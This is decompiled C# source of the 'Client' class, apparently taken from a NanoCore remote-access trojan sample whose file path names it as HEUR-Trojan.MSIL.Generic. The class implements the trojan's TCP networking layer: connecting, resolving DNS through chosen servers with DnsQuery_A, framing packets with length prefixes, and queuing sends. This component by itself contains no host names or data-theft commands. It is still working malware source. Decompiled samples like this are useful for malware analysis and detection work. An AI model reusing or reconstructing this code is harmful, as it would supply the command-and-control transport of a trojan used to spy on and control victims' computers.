// Decompiled with JetBrains decompiler
// Type: Client
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

public sealed class Client
{
  private Client.GDelegate6 gdelegate6_0;
  private Client.GDelegate7 gdelegate7_0;
  private Client.GDelegate4 gdelegate4_0;
  private Client.GDelegate2 gdelegate2_0;
  private Client.GDelegate8 gdelegate8_0;
  private Client.GDelegate3 gdelegate3_0;
  private Client.GDelegate5 gdelegate5_0;
  private Client.GDelegate9 gdelegate9_0;
  private bool bool_0;
  private int int_0;
  private int int_1;
  private bool bool_1;
  private int int_2;
  private int int_3;
  private int int_4;
  private GClass0 gclass0_0;
  private IPEndPoint ipendPoint_0;
  private string string_0;
  private ushort ushort_0;
  private bool bool_2;
  private bool bool_3;
  private bool bool_4;
  private string string_1;
  private bool bool_5;
  private IPAddress[] ipaddress_0;
  private Socket socket_0;
  private SocketAsyncEventArgs socketAsyncEventArgs_0;
  private SocketAsyncEventArgs socketAsyncEventArgs_1;
  private SocketAsyncEventArgs socketAsyncEventArgs_2;
  private int int_5;
  private int int_6;
  private int int_7;
  private byte[] byte_0;
  private byte[] byte_1;
  private byte[] byte_2;
  private byte[] byte_3;
  private bool bool_6;
  private bool bool_7;
  private object object_0;
  private Queue<byte[]> queue_0;

  public Client()
  {
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.int_1 = 10485760;
    this.int_2 = 10485760;
    this.int_3 = 2500;
    this.int_4 = 8000;
    this.object_0 = RuntimeHelpers.GetObjectValue(new object());
    this.bool_4 = true;
    this.string_1 = Guid.NewGuid().ToString();
  }

  public Client(Socket socket_1, bool bool_8, int int_8, int int_9, bool bool_9)
  {
    this.bool_0 = true;
    this.int_0 = (int) ushort.MaxValue;
    this.int_1 = 10485760;
    this.int_2 = 10485760;
    this.int_3 = 2500;
    this.int_4 = 8000;
    this.object_0 = RuntimeHelpers.GetObjectValue(new object());
    this.socket_0 = socket_1;
    this.string_1 = Guid.NewGuid().ToString();
    this.bool_3 = true;
    this.ushort_0 = (ushort) ((IPEndPoint) socket_1.LocalEndPoint).Port;
    this.bool_0 = bool_8;
    this.int_0 = int_8;
    this.int_1 = int_9;
    this.bool_1 = bool_9;
    this.method_43();
    this.method_50(socket_1);
  }

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_0(Client.GDelegate6 gdelegate6_1) => this.gdelegate6_0 += gdelegate6_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_1(Client.GDelegate6 gdelegate6_1) => this.gdelegate6_0 -= gdelegate6_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_2(Client.GDelegate7 gdelegate7_1) => this.gdelegate7_0 += gdelegate7_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_3(Client.GDelegate7 gdelegate7_1) => this.gdelegate7_0 -= gdelegate7_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_4(Client.GDelegate4 gdelegate4_1) => this.gdelegate4_0 += gdelegate4_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_5(Client.GDelegate4 gdelegate4_1) => this.gdelegate4_0 -= gdelegate4_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_6(Client.GDelegate2 gdelegate2_1) => this.gdelegate2_0 += gdelegate2_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_7(Client.GDelegate2 gdelegate2_1) => this.gdelegate2_0 -= gdelegate2_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_8(Client.GDelegate8 gdelegate8_1) => this.gdelegate8_0 += gdelegate8_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_9(Client.GDelegate8 gdelegate8_1) => this.gdelegate8_0 -= gdelegate8_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_10(Client.GDelegate3 gdelegate3_1) => this.gdelegate3_0 += gdelegate3_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_11(Client.GDelegate3 gdelegate3_1) => this.gdelegate3_0 -= gdelegate3_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_12(Client.GDelegate5 gdelegate5_1) => this.gdelegate5_0 += gdelegate5_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_13(Client.GDelegate5 gdelegate5_1) => this.gdelegate5_0 -= gdelegate5_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_14(Client.GDelegate9 gdelegate9_1) => this.gdelegate9_0 += gdelegate9_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public void method_15(Client.GDelegate9 gdelegate9_1) => this.gdelegate9_0 -= gdelegate9_1;

  public bool method_16() => this.bool_0;

  public void method_17(bool bool_8)
  {
    if (this.method_36())
      throw new Exception("Unable to change this property while socket is in use.");
    this.bool_0 = bool_8;
  }

  public int method_18() => this.int_0;

  public void method_19(int int_8)
  {
    if (int_8 < 1)
      throw new Exception("Value must be greater than 0.");
    if (this.method_36())
      throw new Exception("Unable to change this property while socket is in use.");
    this.int_0 = int_8;
  }

  public int method_20() => this.int_1;

  public void method_21(int int_8) => this.int_1 = int_8 >= 1 ? int_8 : throw new Exception("Value must be greater than 0.");

  public bool method_22() => this.bool_1;

  public void method_23(bool bool_8) => this.bool_1 = bool_8;

  public int method_24() => this.int_2;

  public void method_25(int int_8) => this.int_2 = int_8 >= 85000 ? int_8 : throw new Exception("Value must be greater than or equal to 85000.");

  public int method_26() => this.int_3;

  public void method_27(int int_8) => this.int_3 = int_8;

  public int method_28() => this.int_4;

  public void method_29(int int_8) => this.int_4 = int_8;

  public GClass0 method_30() => this.gclass0_0;

  public void method_31(GClass0 gclass0_1) => this.gclass0_0 = gclass0_1;

  public IPEndPoint method_32() => this.ipendPoint_0 != null ? this.ipendPoint_0 : new IPEndPoint(IPAddress.None, 0);

  public string method_33() => this.string_0;

  public ushort method_34() => this.ushort_0;

  public bool method_35() => this.bool_2;

  public bool method_36() => this.bool_2 || this.bool_3;

  public bool method_37() => this.bool_4;

  public string method_38() => this.string_1;

  public bool method_39() => this.bool_5;

  public void method_40(bool bool_8) => this.bool_5 = bool_8;

  public IPAddress[] method_41() => this.ipaddress_0;

  public void method_42(IPAddress[] ipaddress_1) => this.ipaddress_0 = ipaddress_1;

  private void method_43()
  {
    this.byte_2 = new byte[4];
    this.byte_0 = new byte[0];
    this.byte_1 = new byte[0];
    this.byte_3 = new byte[this.int_0 * 2 - 1 + 1];
    this.queue_0 = new Queue<byte[]>();
    this.socketAsyncEventArgs_0 = new SocketAsyncEventArgs();
    this.socketAsyncEventArgs_1 = new SocketAsyncEventArgs();
    this.socketAsyncEventArgs_2 = new SocketAsyncEventArgs();
    this.socketAsyncEventArgs_0.SetBuffer(this.byte_3, 0, this.int_0);
    this.socketAsyncEventArgs_1.SetBuffer(this.byte_3, this.int_0, this.int_0);
    this.socketAsyncEventArgs_0.Completed += new EventHandler<SocketAsyncEventArgs>(this.method_52);
    this.socketAsyncEventArgs_1.Completed += new EventHandler<SocketAsyncEventArgs>(this.method_52);
    this.socketAsyncEventArgs_2.Completed += new EventHandler<SocketAsyncEventArgs>(this.method_52);
  }

  public void method_44(string string_2, ushort ushort_1)
  {
    if (!this.bool_4)
      return;
    try
    {
      if (this.method_36())
        return;
      this.string_0 = string_2;
      this.ushort_0 = ushort_1;
      this.bool_3 = true;
      this.method_43();
      IPAddress address = IPAddress.None;
      if (IPAddress.TryParse(this.string_0, out address))
        this.method_47(address, this.ushort_0);
      else
        ThreadPool.QueueUserWorkItem((WaitCallback) (object_1 => ((Delegate0) (() => this.method_45(this.string_0, this.ushort_0)))()));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_45(string string_2, ushort ushort_1)
  {
    try
    {
      IPAddress[] ipaddress_1_1 = (IPAddress[]) null;
      if (this.bool_5)
      {
        if (this.ipaddress_0 != null && this.ipaddress_0.Length != 0)
        {
          foreach (IPAddress ipaddress_1_2 in this.ipaddress_0)
          {
            ipaddress_1_1 = this.method_57(string_2, ipaddress_1_2);
            if (ipaddress_1_1.Length != 0)
              break;
          }
        }
        else
          ipaddress_1_1 = this.method_57(string_2, (IPAddress) null);
        if (ipaddress_1_1.Length == 0)
          ipaddress_1_1 = Dns.GetHostEntry(string_2).AddressList;
      }
      else
        ipaddress_1_1 = Dns.GetHostEntry(string_2).AddressList;
      this.method_46(string_2, ushort_1, ipaddress_1_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_46(string string_2, ushort ushort_1, IPAddress[] ipaddress_1)
  {
    try
    {
      if (this.socket_0 == null)
      {
        foreach (IPAddress ipAddress in ipaddress_1)
        {
          if (ipAddress.AddressFamily == AddressFamily.InterNetwork)
          {
            Client.GDelegate6 gdelegate60 = this.gdelegate6_0;
            if (gdelegate60 != null)
              gdelegate60(this, string_2, ipAddress);
            this.method_47(ipAddress, ushort_1);
            return;
          }
        }
        throw new Exception("Unable to resolve remote host.");
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_47(IPAddress ipaddress_1, ushort ushort_1)
  {
    try
    {
      this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this.socket_0.LingerState = new LingerOption(true, 0);
      this.socketAsyncEventArgs_2.RemoteEndPoint = (EndPoint) new IPEndPoint(ipaddress_1, (int) ushort_1);
      if (Class0.smethod_0(ipaddress_1))
        this.method_48(this.int_3);
      else
        this.method_48(this.int_4);
      if (this.socket_0.ConnectAsync(this.socketAsyncEventArgs_2))
        return;
      this.method_52((object) this.socket_0, this.socketAsyncEventArgs_2);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_48(int int_8) => ThreadPool.QueueUserWorkItem(new WaitCallback(new Client.Class28()
  {
    int_0 = int_8,
    client_0 = this
  }._Lambda\u0024__9));

  private void method_49(int int_8)
  {
    int num = int_8;
    for (int index = 0; index <= num; index += 20)
    {
      if (!this.bool_3)
        return;
      Thread.Sleep(20);
    }
    if (!this.bool_3)
      return;
    this.method_56();
  }

  private void method_50(Socket socket_1)
  {
    try
    {
      this.socketAsyncEventArgs_2.Dispose();
      this.socketAsyncEventArgs_2 = (SocketAsyncEventArgs) null;
      this.ipendPoint_0 = (IPEndPoint) socket_1.RemoteEndPoint;
      this.bool_3 = false;
      this.bool_2 = true;
      if (!this.method_37())
        return;
      Client.GDelegate7 gdelegate70 = this.gdelegate7_0;
      if (gdelegate70 != null)
        gdelegate70(this, true);
      this.method_51();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  public void method_51()
  {
    if (this.socket_0.ReceiveAsync(this.socketAsyncEventArgs_0))
      return;
    this.method_52((object) this.socket_0, this.socketAsyncEventArgs_0);
  }

  private void method_52(object sender, SocketAsyncEventArgs e)
  {
    try
    {
      if (this.socket_0 == null || this.socket_0 != sender)
        return;
      if (e.SocketError == SocketError.Success)
      {
        switch (e.LastOperation)
        {
          case SocketAsyncOperation.Connect:
            this.method_50(this.socket_0);
            break;
          case SocketAsyncOperation.Receive:
            if (e.BytesTransferred == 0)
            {
              this.method_56();
              break;
            }
            if (this.bool_1)
            {
              Client.GDelegate8 gdelegate80 = this.gdelegate8_0;
              if (gdelegate80 != null)
                gdelegate80(this, e.BytesTransferred);
            }
            this.method_53(e.Buffer, 0, e.BytesTransferred);
            if (this.socket_0.ReceiveAsync(e))
              break;
            this.method_52((object) this.socket_0, e);
            break;
          case SocketAsyncOperation.Send:
            if (this.bool_0 && this.int_6 == 0)
              this.int_6 = -4;
            this.int_6 += e.BytesTransferred;
            if (this.bool_1)
            {
              Client.GDelegate5 gdelegate50 = this.gdelegate5_0;
              if (gdelegate50 != null)
                gdelegate50(this, e.BytesTransferred);
            }
            bool flag;
            if (this.int_6 == this.byte_1.Length)
            {
              flag = true;
              Client.GDelegate3 gdelegate30 = this.gdelegate3_0;
              if (gdelegate30 != null)
                gdelegate30(this, this.byte_1.Length);
            }
            object object0 = this.object_0;
            ObjectFlowControl.CheckForSyncLockOnValueType(object0);
            Monitor.Enter(object0);
            try
            {
              if (this.queue_0.Count == 0 && flag)
              {
                this.bool_7 = false;
                Array.Resize<byte>(ref this.byte_1, 0);
                if (this.int_6 >= this.int_2)
                  GC.Collect();
                this.int_6 = 0;
                break;
              }
              this.method_55();
              break;
            }
            finally
            {
              Monitor.Exit(object0);
            }
        }
      }
      else
      {
        Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
        if (gdelegate90 != null)
          gdelegate90(this, (Exception) new SocketException((int) e.SocketError));
        this.method_56();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_53(byte[] byte_4, int int_8, int int_9)
  {
    if (this.bool_0)
    {
      if (this.bool_6)
      {
        int count = Math.Min(this.byte_0.Length - this.int_5, int_9 - int_8);
        Buffer.BlockCopy((Array) byte_4, int_8, (Array) this.byte_0, this.int_5, count);
        this.int_5 += count;
        if (this.int_5 == this.byte_0.Length)
        {
          Client.GDelegate2 gdelegate20 = this.gdelegate2_0;
          if (gdelegate20 != null)
            gdelegate20(this, this.byte_0);
          this.bool_6 = false;
          Array.Resize<byte>(ref this.byte_0, 0);
          if (this.int_5 >= this.int_2)
            GC.Collect();
        }
        if (count >= int_9 - int_8)
          return;
        this.method_53(byte_4, int_8 + count, int_9);
      }
      else
      {
        int count = Math.Min(int_9 - int_8, 4 - this.int_7);
        Buffer.BlockCopy((Array) byte_4, int_8, (Array) this.byte_2, this.int_7, count);
        int_8 += count;
        this.int_7 += count;
        if (this.int_7 != 4)
          return;
        int int32 = BitConverter.ToInt32(this.byte_2, 0);
        if (int32 > this.int_1)
        {
          Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
          if (gdelegate90 != null)
            gdelegate90(this, new Exception("Packet size exceeds MaxPacketSize."));
          this.method_56();
        }
        else if (int32 <= 0)
        {
          Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
          if (gdelegate90 != null)
            gdelegate90(this, new Exception("Packet size must be greater than 0."));
          this.method_56();
        }
        else
        {
          this.int_5 = 0;
          this.int_7 = 0;
          this.bool_6 = true;
          Array.Resize<byte>(ref this.byte_0, int32);
          if (int_8 >= int_9)
            return;
          this.method_53(byte_4, int_8, int_9);
        }
      }
    }
    else
    {
      Array.Resize<byte>(ref this.byte_0, int_9);
      Buffer.BlockCopy((Array) byte_4, 0, (Array) this.byte_0, 0, int_9);
      Client.GDelegate2 gdelegate20 = this.gdelegate2_0;
      if (gdelegate20 == null)
        return;
      gdelegate20(this, this.byte_0);
    }
  }

  public void method_54(byte[] byte_4)
  {
    if (!this.bool_2)
      return;
    try
    {
      object object0 = this.object_0;
      ObjectFlowControl.CheckForSyncLockOnValueType(object0);
      Monitor.Enter(object0);
      try
      {
        this.queue_0.Enqueue(byte_4);
        if (this.bool_7)
          return;
        this.bool_7 = true;
        this.method_55();
      }
      finally
      {
        Monitor.Exit(object0);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Client.GDelegate9 gdelegate90 = this.gdelegate9_0;
      if (gdelegate90 != null)
        gdelegate90(this, exception_0);
      this.method_56();
      ProjectData.ClearProjectError();
    }
  }

  private void method_55()
  {
    if (this.int_6 == this.byte_1.Length)
    {
      this.int_6 = 0;
      object object0 = this.object_0;
      ObjectFlowControl.CheckForSyncLockOnValueType(object0);
      Monitor.Enter(object0);
      try
      {
        this.byte_1 = this.queue_0.Dequeue();
      }
      finally
      {
        Monitor.Exit(object0);
      }
    }
    int num;
    if (this.bool_0 && this.int_6 == 0)
    {
      num = 4;
      Buffer.BlockCopy((Array) BitConverter.GetBytes(this.byte_1.Length), 0, (Array) this.byte_3, this.socketAsyncEventArgs_1.Offset, 4);
    }
    int count = Math.Min(this.byte_1.Length - this.int_6, this.int_0 - num);
    Buffer.BlockCopy((Array) this.byte_1, this.int_6, (Array) this.byte_3, this.socketAsyncEventArgs_1.Offset + num, count);
    this.socketAsyncEventArgs_1.SetBuffer(this.socketAsyncEventArgs_1.Offset, count + num);
    if (this.socket_0.SendAsync(this.socketAsyncEventArgs_1))
      return;
    this.method_52((object) this.socket_0, this.socketAsyncEventArgs_1);
  }

  public void method_56()
  {
    if (!this.method_36())
      return;
    bool bool2 = this.bool_2;
    bool bool3 = this.bool_3;
    this.bool_2 = false;
    this.bool_3 = false;
    if (this.socket_0 != null)
    {
      this.socket_0.Close();
      this.socket_0 = (Socket) null;
    }
    if (this.socketAsyncEventArgs_0 != null)
    {
      this.socketAsyncEventArgs_0.Dispose();
      this.socketAsyncEventArgs_0 = (SocketAsyncEventArgs) null;
    }
    if (this.socketAsyncEventArgs_1 != null)
    {
      this.socketAsyncEventArgs_1.Dispose();
      this.socketAsyncEventArgs_1 = (SocketAsyncEventArgs) null;
    }
    if (this.socketAsyncEventArgs_2 != null)
    {
      this.socketAsyncEventArgs_2.Dispose();
      this.socketAsyncEventArgs_2 = (SocketAsyncEventArgs) null;
    }
    if (this.queue_0 != null)
    {
      this.queue_0.Clear();
      this.queue_0 = (Queue<byte[]>) null;
    }
    this.int_6 = 0;
    this.int_5 = 0;
    this.byte_2 = (byte[]) null;
    this.byte_0 = (byte[]) null;
    this.byte_1 = (byte[]) null;
    this.byte_3 = (byte[]) null;
    this.bool_6 = false;
    this.bool_7 = false;
    if (bool2)
    {
      Client.GDelegate7 gdelegate70 = this.gdelegate7_0;
      if (gdelegate70 == null)
        return;
      gdelegate70(this, false);
    }
    else
    {
      if (!bool3)
        return;
      Client.GDelegate4 gdelegate40 = this.gdelegate4_0;
      if (gdelegate40 == null)
        return;
      gdelegate40(this);
    }
  }

  private IPAddress[] method_57(string string_2, IPAddress ipaddress_1)
  {
    List<IPAddress> ipAddressList = new List<IPAddress>();
    Client.Struct1 struct1 = this.method_58(ipaddress_1);
    string string_2_1 = string_2;
    ref Client.Struct1 local1 = ref struct1;
    IntPtr ptr;
    ref IntPtr local2 = ref ptr;
    IntPtr zero = IntPtr.Zero;
    ref IntPtr local3 = ref zero;
    if (Client.DnsQuery_A(string_2_1, (short) 1, 72, ref local1, ref local2, ref local3) == 0)
    {
      Client.DnsRecord structure = (Client.DnsRecord) Marshal.PtrToStructure(ptr, typeof (Client.DnsRecord));
      IPAddress ipAddress1 = this.method_59(structure);
      if (ipAddress1 != IPAddress.None)
        ipAddressList.Add(ipAddress1);
      while (!(structure.intptr_0 == IntPtr.Zero))
      {
        structure = (Client.DnsRecord) Marshal.PtrToStructure(structure.intptr_0, typeof (Client.DnsRecord));
        IPAddress ipAddress2 = this.method_59(structure);
        if (ipAddress2 != IPAddress.None)
          ipAddressList.Add(ipAddress2);
      }
    }
    return ipAddressList.ToArray();
  }

  private Client.Struct1 method_58(IPAddress ipaddress_1)
  {
    if (ipaddress_1 == null)
    {
      Client.Struct1 struct1;
      return struct1;
    }
    return new Client.Struct1()
    {
      int_0 = 1,
      uint_0 = new uint[1]
      {
        BitConverter.ToUInt32(ipaddress_1.GetAddressBytes(), 0)
      }
    };
  }

  private IPAddress method_59(Client.DnsRecord dnsRecord_0) => dnsRecord_0.short_0 != (short) 1 || (dnsRecord_0.int_0 & 3) >= 2 ? IPAddress.None : new IPAddress((long) dnsRecord_0.uint_0);

  [DllImport("dnsapi.dll")]
  private static extern int DnsQuery_A(
    string string_2,
    short short_0,
    int int_8,
    ref Client.Struct1 struct1_0,
    ref IntPtr intptr_0,
    ref IntPtr intptr_1);

  public delegate void GDelegate2(Client client_0, byte[] byte_0);

  public delegate void GDelegate3(Client client_0, int int_0);

  internal sealed class Class28
  {
    public int int_0;
    public Client client_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__10() => this.client_0.method_49(this.int_0);

    [CompilerGenerated]
    [DebuggerStepThrough]
    [SpecialName]
    public void _Lambda\u0024__9(object object_0) => ((Delegate0) (() => this.client_0.method_49(this.int_0)))();
  }

  public delegate void GDelegate4(Client client_0);

  public delegate void GDelegate5(Client client_0, int int_0);

  public delegate void GDelegate6(Client client_0, string string_0, IPAddress ipaddress_0);

  public delegate void GDelegate7(Client client_0, bool bool_0);

  public delegate void GDelegate8(Client client_0, int int_0);

  public delegate void GDelegate9(Client client_0, Exception exception_0);

  [StructLayout(LayoutKind.Sequential, Pack = 1)]
  private struct Struct1
  {
    public int int_0;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)]
    public uint[] uint_0;
  }

  [StructLayout(LayoutKind.Sequential, Pack = 1)]
  private struct DnsRecord
  {
    public IntPtr intptr_0;
    public string string_0;
    public short short_0;
    public short short_1;
    public int int_0;
    public int int_1;
    public int int_2;
    public uint uint_0;
  }
}
